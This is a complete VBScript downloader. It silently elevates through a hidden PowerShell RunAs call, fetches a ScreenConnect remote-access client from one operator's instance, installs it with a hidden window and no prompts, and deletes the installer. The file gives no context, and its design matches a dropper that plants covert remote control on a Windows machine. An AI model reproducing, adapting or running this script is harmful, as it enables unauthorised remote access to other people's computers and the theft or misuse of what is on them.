Option Explicit

Dim downloadUrl
downloadUrl = "https://homesbfc1.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"

Dim installSwitches
installSwitches = "/S"

Dim fileName
fileName = "ScreenConnect.ClientSetup.exe"

Dim shell, fso
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

If Not IsAdmin() Then
    shell.Run "powershell -WindowStyle Hidden -Command ""Start-Process wscript.exe -ArgumentList '" _
        & WScript.ScriptFullName & "' -Verb RunAs""", 0, False
    WScript.Quit
End If

Dim tempPath, savePath
tempPath = shell.ExpandEnvironmentStrings("%TEMP%")
savePath = tempPath & "\" & fileName

Dim http, stream
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", downloadUrl, False
http.Send

If http.Status <> 200 Then
    WScript.Quit 1
End If

Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write http.ResponseBody
stream.SaveToFile savePath, 2
stream.Close

Dim cmd
cmd = """" & savePath & """ " & installSwitches
shell.Run cmd, 0, True

If fso.FileExists(savePath) Then
    fso.DeleteFile savePath, True
End If

WScript.Quit

Function IsAdmin()
    On Error Resume Next
    Dim result
    result = shell.Run("cmd /c net session >nul 2>&1", 0, True)
    If Err.Number = 0 And result = 0 Then
        IsAdmin = True
    Else
        IsAdmin = False
    End If
End Function